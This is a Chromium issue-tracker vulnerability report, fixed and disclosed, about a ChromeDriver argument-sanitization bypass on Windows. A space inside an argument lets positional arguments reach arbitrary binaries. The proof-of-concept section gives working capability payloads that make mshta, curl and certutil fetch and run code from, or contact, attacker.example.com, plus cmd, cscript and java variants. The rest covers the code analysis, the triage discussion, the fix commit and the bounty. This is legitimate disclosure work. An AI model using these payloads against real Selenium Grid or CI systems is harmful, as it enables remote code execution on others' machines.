# ChromeDriver Argument Sanitization Bypass — Positional Argument Injection

| Field | Value |
|-------|-------|
| **Issue ID** | [494464734](https://issues.chromium.org/issues/494464734) |
| **Status** | Fixed |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>Browser Automation>ChromeDriver |
| **Platforms** | Mac |
| **Reporter** | ia...@gmail.com |
| **Assignee** | al...@google.com |
| **Created** | 2026-03-20 |
| **Bounty** | $500.00 |

## Description

# Steps to reproduce the problem

## Proof of Concept

### 1. Observe the bypass via chrome://version

Start ChromeDriver locally and create a session:

```
{
  "desiredCapabilities": {
    "browserName": "chrome",
    "goog:chromeOptions": {
      "args": ["/c whoami", "-jar x.jar"]
    }
  }
}

```

Navigate to `chrome://version`. The Command Line field shows:

```
chrome.exe -jar /c --allow-pre-commit-input ... --flag-switches-end x.jar whoami data:,

```

`x.jar` and `whoami` appear after `--flag-switches-end` as bare positional arguments — no `--` prefix.

### 2. Remote HTA execution via mshta.exe (no local file needed)

```
{
  "desiredCapabilities": {
    "browserName": "chrome",
    "goog:chromeOptions": {
      "binary": "C:\\Windows\\System32\\mshta.exe",
      "args": ["-x http://attacker.example.com/payload.hta"]
    }
  }
}

```

`mshta.exe` receives `http://attacker.example.com/payload.hta` as a positional argument, fetches the URL, and executes the HTA contents at OS level. No file on disk is required.

### 3. Outbound HTTP request via curl.exe (no local file needed)

```
{
  "desiredCapabilities": {
    "browserName": "chrome",
    "goog:chromeOptions": {
      "binary": "C:\\Windows\\System32\\curl.exe",
      "args": ["-s http://attacker.example.com/proof"]
    }
  }
}

```

`curl.exe` receives `-s` (silent) and `http://attacker.example.com/proof` (URL). The attacker's server receives the request — confirming execution.

### 4. File download via certutil.exe (no local file needed)

```
{
  "desiredCapabilities": {
    "browserName": "chrome",
    "goog:chromeOptions": {
      "binary": "C:\\Windows\\System32\\certutil.exe",
      "args": ["-urlcache -split -f http://attacker.example.com/payload C:\\Users\\Public\\payload.exe"]
    }
  }
}

```

certutil downloads the remote file to a local path.

# Problem Description

ChromeDriver prepends `--` to all arguments passed via `goog:chromeOptions.args` to prevent meaningful argument injection to non-Chrome binaries launched via `goog:chromeOptions.binary`. This sanitization can be bypassed on Windows by including a space in the argument string.

When an argument like `"-s http://attacker/exfil"` is passed, `SetUnparsedSwitch()` stores the entire string as a single switch name. On Windows, `GetCommandLineString()` flattens `argv_` into a string for `CreateProcess()`, and the space causes word splitting — producing a bare positional argument with no `--` prefix.

## The Bypass

`SetUnparsedSwitch()` in `capabilities.cc` splits arguments on `=` only. Spaces are not handled:

```
void Switches::SetUnparsedSwitch(const std::string& unparsed_switch) {
  std::string value;
  size_t equals_index = unparsed_switch.find('=');
  if (equals_index != std::string::npos)
    value = unparsed_switch.substr(equals_index + 1);

  std::string name;
  size_t start_index = 0;
  if (unparsed_switch.substr(0, 2) == "--")
    start_index = 2;
  name = unparsed_switch.substr(start_index, equals_index - start_index);
  SetSwitch(name, value);
}

```

An argument with a space (e.g., `"-s http://attacker/exfil"`) is stored as a single switch name containing a space. `AppendSwitchNative()` inserts it into `argv_` as one entry. On Windows, `GetCommandLineString()` flattens `argv_` to a string without quoting the space, so `CreateProcess()` splits it into separate tokens:

- `"-s http://attacker/exfil"` → CreateProcess sees two tokens: `-s` (prefixed flag) and `http://attacker/exfil` (bare positional argument, no `--` prefix)
- `"-x http://attacker/evil.hta"` → `-x` (prefixed flag) and `http://attacker/evil.hta` (bare positional)
- `"/c whoami"` → `/c` (prefixed flag) and `whoami` (bare positional)
  This enables passing attacker-controlled arguments to arbitrary binaries, including binaries that fetch and execute remote content with no local file precondition.

# Additional Comments

## Impact

The `--` prefix sanitization is ChromeDriver's primary control against argument injection to non-Chrome binaries. This bypass defeats it entirely, enabling:

- `mshta.exe` + `"-x http://attacker/evil.hta"` → fetches and executes remote HTA at OS level (no local file)
- `curl.exe` + `"-s http://attacker/exfil"` → outbound HTTP request to attacker (no local file)
- `certutil.exe` + `"-urlcache -f http://attacker/p C:\Users\Public\p.exe"` → downloads remote file to disk
- `cscript.exe` + `"-B C:\path\to\script.vbs"` → executes VBScript from disk
- `java.exe` + `"-jar C:\path\to\payload.jar"` → executes Java JAR
- `cmd.exe` + `"/c whoami"` → executes shell command

Affected environments: Selenium Grid deployments, cloud testing platforms, CI/CD pipelines — anywhere ChromeDriver accepts session capabilities from untrusted input.

# Summary

ChromeDriver Argument Sanitization Bypass — Positional Argument Injection

# Custom Questions

#### Reporter credit:

Ryan Jupp - HAAO

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A \

## Timeline

### es...@chromium.org (2026-03-21)

Thanks for the report. This is a bit odd as it doesn't concern Chrome itself, so I'm not sure whether to treat it as a vulnerability or not, and I'm not sure how common an exploitable scenario would be. I suspect an attacker who can control Chrome's command-line flags can already gain RCE. It does seem worth fixing though.

### ia...@gmail.com (2026-03-21)

Thanks for taking the time to review this.

I want to address a couple points:

"An attacker who can control Chrome's command-line flags can already gain RCE"

I believe this is exactly the scenario ChromeDriver's `--` prefix sanitization was designed to prevent. The sanitization exists because goog:chromeOptions.args is expected to be attacker-controllable input in multi-tenant environments (Selenium Grid, cloud testing platforms, CI/CD). The `--` prefix ensures that even with binary set to a non-Chrome executable, the attacker can only pass ---prefixed flags, not positional arguments, not bare URLs, not shell commands.

This bypass defeats that control entirely. Without it, for example, an attacker who sets binary to `mshta.exe` and passes `["--http://attacker/evil.hta"]` gets nothing — mshta doesn't recognize prefixed arguments.

So the `--` prefix is load-bearing security logic, and this is a clean bypass of it.

"Not sure how common an exploitable scenario would be"

Selenium Grid is widely deployed in exactly the configuration this targets — a central hub accepting desiredCapabilities from multiple users/jobs. Major cloud testing platforms (BrowserStack, Sauce Labs, LambdaTest) and CI/CD pipelines (GitHub Actions, Jenkins) all run ChromeDriver sessions from semi-trusted or untrusted input. Any deployment where session capabilities aren't locked down at the grid level is vulnerable.

### ch...@google.com (2026-03-21)

Setting Priority to P3 to match Severity s3. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### ia...@gmail.com (2026-03-21)

Thanks again.

I believe a complete bypass of a security boundary that directly enables RCE is more consistent with S2/P2. I originally discovered this vulnerability while bug hunting against a real target and achieved RCE through this vector — this isn't a theoretical deployment scenario.

Ryan

### dx...@google.com (2026-03-24)

Project: chromium/src  

Branch:  main  

Author:  Alex N. Jose [alexnj@chromium.org](mailto:alexnj@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7695604>

Reinforce Chrome argument sanitization

---


Expand for full commit details
```
     
    This CL fixes the potential vulnerability that can result in 
    a positional argument injection. 
     
    This approach alone does not fix the full extent of the vulnerability, 
    and will be followed up by a larger set of changes that are in 
    progress. 
     
    Bug: 494464734 
    Change-Id: I5b3ad04af7ed7c9ad981be91270fe595106d6e10 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7695604 
    Commit-Queue: Peter Kvitek <kvitekp@chromium.org> 
    Auto-Submit: Alex N. Jose <alexnj@chromium.org> 
    Reviewed-by: Peter Kvitek <kvitekp@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1604325}

```

---

Files:

- M `chrome/test/chromedriver/capabilities.cc`
- M `chrome/test/chromedriver/capabilities_unittest.cc`

---

Hash: [accd14f5a47977dd274bc2eb01f940894eb808fd](https://chromiumdash.appspot.com/commit/accd14f5a47977dd274bc2eb01f940894eb808fd)  

Date: Tue Mar 24 19:57:30 2026


---

### ia...@gmail.com (2026-04-07)

Hey there, the last update was on March 31st with a status change to reward-topanel, is there an ETA for when I'll hear back about the reward? Also, could I please request a CVE for this?

Ryan

### nw...@google.com (2026-05-04)

Found is value is estimated based on date found

### ch...@google.com (2026-05-05)

WARNING: Removing security\_release value because the issue is not on security\_impact-stable or security\_impact-extended hotlists. Please add to the correct hotlist if the issue is on a release branch.

### ch...@google.com (2026-05-06)

WARNING: Removing security\_release value because the issue is not on security\_impact-stable or security\_impact-extended hotlists. Please add to the correct hotlist if the issue is on a release branch.

### ch...@google.com (2026-05-07)

WARNING: Removing security\_release value because the issue is not on security\_impact-stable or security\_impact-extended hotlists. Please add to the correct hotlist if the issue is on a release branch.

### sp...@google.com (2026-06-03)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $500.00 for this report.

Rationale for this decision:
Baseline. User information disclosure


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-08)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/494464734)*
